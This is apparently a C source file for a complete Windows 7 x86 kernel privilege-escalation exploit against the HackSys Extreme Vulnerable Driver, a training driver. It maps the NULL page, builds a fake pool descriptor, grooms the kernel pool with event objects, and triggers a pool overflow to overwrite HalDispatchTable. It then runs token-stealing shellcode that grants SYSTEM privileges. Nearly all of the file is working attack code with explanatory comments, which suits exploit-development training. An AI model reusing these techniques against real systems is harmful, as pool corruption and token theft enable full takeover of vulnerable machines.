#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);


//From http://stackoverflow.com/a/26414236 this defines the details of the NtAllocateVirtualMemory function
//which we will use to map the NULL page in user space.
typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);
typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource,
	OUT PULONG Interval);

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID

VOID TokenStealingShellcodeWin7Generic() {
	// No Need of Kernel Recovery as we are not corrupting anything
	__asm {
		; initialize
		pushad; save registers state

		xor eax, eax; Set zero
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current _EPROCESS structure

		mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process
			popad; restore registers state
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD lpBytesReturned;
	LPCSTR lpDeviceName = (LPCSTR) "\\\\.\\HackSysExtremeVulnerableDriver";

	printf("Getting the device handle\r\n");
	//HANDLE WINAPI CreateFile( _In_ lpFileName, _In_ dwDesiredAccess, _In_ dwShareMode, _In_opt_ lpSecurityAttributes,
	//_In_ dwCreationDisposition, _In_ dwFlagsAndAttributes, _In_opt_ hTemplateFile );
	HANDLE hDriver = CreateFile(lpDeviceName,			//File name - in this case our device name
		GENERIC_READ | GENERIC_WRITE,					//dwDesiredAccess - type of access to the file, can be read, write, both or neither. We want read and write because thats the permission the driver declares we need.
		FILE_SHARE_READ | FILE_SHARE_WRITE,				//dwShareMode - other processes can read and write to the driver while we're using it but not delete it - FILE_SHARE_DELETE would enable this.
		NULL,											//lpSecurityAttributes - Optional, security descriptor for the returned handle and declares whether inheriting processes can access it - unneeded for us.
		OPEN_EXISTING,									//dwCreationDisposition - what to do if the file/device doesn't exist, in this case only opens it if it already exists, returning an error if it doesn't.
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,	//dwFlagsAndAttributes - In this case the FILE_ATTRIBUTE_NORMAL means that the device has no special file attributes and FILE_FLAG_OVERLAPPED means that the device is being opened for async IO.
		NULL);											//hTemplateFile - Optional, only used when creating a new file - takes a handle to a template file which defineds various attributes for the file being created.

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle :( 0x%X\r\n", GetLastError());
		return 1;
	}
	printf("Got the device Handle: 0x%X\r\n", hDriver);

	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

	if (hNtdll == INVALID_HANDLE_VALUE) {
		printf("Could not open handle to ntdll. \n");
		CloseHandle(hDriver);
		return 1;
	}

	//Get address of NtAllocateVirtualMemory from the dynamically linked library and then cast it to a callable function type
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");;

	if (!NtAllocateVirtualMemory) {
		printf("Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return 1;
	}

	//We can't outright pass NULL as the address but if we pass 1 then it gets rounded down to 0...
	PVOID baseAddress = (PVOID)0x1;
	SIZE_T regionSize = 0x2500; //Probably enough, it will get rounded up to the next page size
								// Map the null page
	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(), //Current process handle
		&baseAddress, //address we want our memory to start at, will get rounded down to the nearest page boundary
		0, //The number of high-order address bits that must be zero in the base address of the section view. Not a clue here
		&regionSize, //Required size - will be modified to actual size allocated, is rounded up to the next page boundary
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, //claim memory straight away, get highest appropriate address
		PAGE_EXECUTE_READWRITE //All permissions
	);

	if (ntStatus != 0) {
		printf("Virtual Memory Allocation Failed: 0x%x\n", ntStatus);
		return 1;
	}

	printf("Address allocated at: 0x%p\n", baseAddress);
	printf("Allocated memory size: 0x%X\n", regionSize);

	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}
	ULONG len = 0;
	query(SystemModuleInformation, NULL, 0, &len);
	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	if (pModuleInfo == NULL) {
		printf("Could not allocate memory for module info.\n");
		return 1;
	}
	query(SystemModuleInformation, pModuleInfo, len, &len);
	if (len == 0) {
		printf("Failed to retrieve system module information\n");
		return 1;
	}
	PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;
	PCHAR kernelImage = (PCHAR)pModuleInfo->Modules[0].Name;
	kernelImage = strrchr(kernelImage, '\\') + 1;
	printf("Kernel Image Base 0x%X\n", kernelImageBase);
	printf("Kernel Image name %s\n", kernelImage);

	HMODULE userBase = LoadLibrary(kernelImage);
	PVOID dispatch = (PVOID)GetProcAddress(userBase, "HalDispatchTable");
	dispatch = (PVOID)((ULONG)dispatch - (ULONG)userBase + (ULONG)kernelImageBase);
	printf("User Mode kernel image base address: 0x%X\n", userBase);
	printf("Kernel mode kernel image base address: 0x%X\n", kernelImageBase);
	printf("HalDispatchTable address: 0x%X\n", dispatch);

	ULONG what = (ULONG)&TokenStealingShellcodeWin7Generic;
	ULONG where = (ULONG)((ULONG)dispatch + sizeof(PVOID));
	printf("Shellcode: 0x%X\n", what);
	printf("write address: 0x%X\n", where);

	HANDLE hDefragEvents[0x2500];
	HANDLE hPoolGroomEvents[0x2500];

	RtlZeroMemory((PCHAR)0x0, 0x1300);
	//Create a fake POOL_DESCRIPTOR ,the values were yoinked straight from https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp
	//dt - r nt!_POOL_DESCRIPTOR	
	*(PCHAR)0x0 = 1;
	//+ 0x000 PoolType         : PagedPool = 0n1
	*(PCHAR)0x4 = 1;
	//+0x004 PagedLock        : _KGUARDED_MUTEX
	*(PCHAR*)0x100 = (PCHAR)0x1208;
		//+ 0x100 PendingFrees : 0x1208 //This address will be written to the targetted 'where' address
		
	*(PCHAR*)0x104 = (PCHAR)0x20;
		//+0x104 PendingFreeDepth : 0x20 - the pending free needs to be atleast 32 to so that ExFreePoolWithTag actually free's everything
			
	for (unsigned int i = 0x140; i < 0x1140; i += 8) {
		*(PCHAR*)i = (PCHAR)where - 4;
	}
		//+0x140 ListHeads : [512] _LIST_ENTRY
			//+ 0x000 Flink : (PCHAR)where - 4
			//+ 0x004 Blink : (PCHAR)where - 4
			//And repeat...
		//The addresses of the object on the PendingFrees list which is currently 0x1208 will be written to the 'where' address when it is linked into the fron of the list

	//Create fake Pool headers
	*(PINT)0x1200 = (INT)0x060c0a00;
	*(PINT)0x1204 = (INT)0x6f6f6f6f;
	//dt nt!_POOL_HEADER 0x1200
	//+0x000 PreviousSize     : 0y000000000(0)
	//	+ 0x000 PoolIndex : 0y0000101(0x5)
	//	+ 0x002 BlockSize : 0y000001100(0xc)
	//	+ 0x002 PoolType : 0y0000011(0x3)
	//	+ 0x000 Ulong1 : 0x60c0a00
	//	+ 0x004 PoolTag : 0x6f6f6f6f
	//	+ 0x004 AllocatorBackTraceIndex : 0x6f6f
	//	+ 0x006 PoolTagHash : 0x6f6f
	*(PCHAR*)0x1208 = (PCHAR)0x0; //the next pointer for the pending free list, as this is NULL it will stop free'ing
	*(PINT)0x1260 = (INT)0x060c0a0c;
	*(PINT)0x1264 = (INT)0x6f6f6f6f;
	//dt nt!_POOL_HEADER 0x1260
	//+0x000 PreviousSize     : 0y000001100(0xc)
	//	+ 0x000 PoolIndex : 0y0000101(0x5)
	//	+ 0x002 BlockSize : 0y000001100(0xc)
	//	+ 0x002 PoolType : 0y0000011(0x3)
	//	+ 0x000 Ulong1 : 0x60c0a0c
	//	+ 0x004 PoolTag : 0x6f6f6f6f
	//	+ 0x004 AllocatorBackTraceIndex : 0x6f6f
	//	+ 0x006 PoolTagHash : 0x6f6f

	for (unsigned int i = 0; i < 0x2500; i++) {
		HANDLE hEvent = CreateEvent(NULL, false, false, TEXT(""));
		if (hEvent == NULL) {
			printf("Failed to create defrag event 0x%X: 0x%X\r\n", i, GetLastError());
			return 1;
		}
		hDefragEvents[i] = hEvent;
	}

	printf("Pool defrag'd\r\n");

	for (unsigned int i = 0; i < 0x2500; i++) {
		HANDLE hEvent = CreateEvent(NULL, false, false, TEXT(""));
		if (hEvent == NULL) {
			printf("Failed to create groom event 0x%X: 0x%X\r\n", i, GetLastError());
			return 1;
		}
		hPoolGroomEvents[i] = hEvent;
	}

	printf("Grooming phase 1 complete - contiguous events allocated.\r\n");

	for (unsigned int i = 0; i < 0x2500; i += 0x10) {
		for (unsigned int j = 0; j < 8; j++) {
			HANDLE hEvent = hPoolGroomEvents[i + j];
			if (!CloseHandle(hEvent)) {
				printf("Failed to punch hole with event object 0x%X: 0x%X\r\n", hEvent, GetLastError());
				return 1;
			}
		}
	}

	printf("Grooming complete - pool full o'holes\r\n");



	size_t nInBufferSize = 0x1FC;
	PULONG lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);

	if (!lpInBuffer) {
		printf("HeapAlloc failed :( 0x%X\r\n", GetLastError());
		return 1;
	}

	printf("Input buffer allocated as 0x%X bytes.\r\n", nInBufferSize);
	printf("Input buffer address: 0x%p\r\n", lpInBuffer);

	printf("Filling buffer.\r\n");

	memset(lpInBuffer, 0x41, nInBufferSize);

	//First of all we overwrite the POOL_HEADER structure, we aren't modifying any of the values here
	//They're just being set to what they should be on any of the Events we allocated for Pool grooming.
	//For more details http://www.codemachine.com/article_kernelstruct.html#POOL_HEADER & http://codemachine.com/article_objectheader.html
	//In summary it consists of meta data used by the pool allocated, debugging tools, etc
	lpInBuffer[0x1F8 / 4] = 0x06080a40;

	//dt nt!_POOL_HEADER  
	//  + 0x000 PreviousSize : Pos 0, 9 Bits  => 0x40  
	//	+ 0x000 PoolIndex : Pos 9, 7 Bits => 0x5 //Out of bounds
	//	+ 0x002 BlockSize Pos 0, 9 Bits => 0x8
	//	+ 0x002 PoolType : Pos 9, 7 Bits => 0x3 (Paged Pool)
	//	+ 0x000 Ulong1 : Uint4B => 0x06400a40 (Just a union field)
	//We stop overwriting after the first 4 bytes and leave the rest as default
	//	+ 0x004 PoolTag : Uint4B=> 0xee657645 => 'Even'
	//	+ 0x004 AllocatorBackTraceIndex : Uint2B => 0x7645
	//	+ 0x006 PoolTagHash : Uint2B => 0xee65

	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_POOL_OVERFLOW,
		lpInBuffer,
		nInBufferSize,
		NULL,
		0,
		&lpBytesReturned,
		NULL);
	printf("Overflow triggered\r\n");

	for (unsigned int i = 0; i < 0x2500; i++) {
		HANDLE hEvent = hDefragEvents[i];
		if (!CloseHandle(hEvent)) {
			printf("Failed to remove defrag event object 0x%X: 0x%X\r\n", hEvent, GetLastError());
			return 1;
		}
	}

	printf("All defrag objects free'd\r\n");
	fflush(stdout);
	for (unsigned int i = 8; i < 0x2500; i += 0x10) {
		for (unsigned int j = 0; j < 8; j++) {
			HANDLE hEvent = hPoolGroomEvents[i + j];
			if (!CloseHandle(hEvent)) {
				printf("Failed to remove pool groom event object 0x%X: 0x%X\r\n", hEvent, GetLastError());
				return 1;
			}
		}
	}

	printf("Bug triggered - all event's free'd.\r\n");

	printf("Setting up payload\r\n");
	//When the kernel tries to execute nt!HalDispatchTable+0x4 it will end up executing at 0x1208
	//Which has been preloaded with opcodes to execute our shellcode and then return
	/*00001208 b8ADDRESS      mov     eax, what
	0000120d ffd0            call    eax
	0000120f c9              leave
	00001210 c3              ret*/
	*(PUCHAR)0x1208 = 0xb8;
	*(PINT)0x1209 = (INT)what;
	*(PUCHAR)0x120D = 0xff;
	*(PUCHAR)0x120E = 0xd0;
	*(PUCHAR)0x120F = 0xc9;
	*(PUCHAR)0x1210 = 0xc3;
	printf("triggering payload\r\n");
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtdll, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile) {
		printf("Failed Resolving NtQueryIntervalProfile. \n");
		return 1;
	}
	printf("Triggering shellcode\n");
	ULONG interval = 1;
	NtQueryIntervalProfile(2, &interval);
	system("calc.exe");

	printf("Exploit complete, tidying up.\r\n");
	HeapFree(GetProcessHeap(), 0, lpInBuffer);
	CloseHandle(hDriver);
	return 0;
}
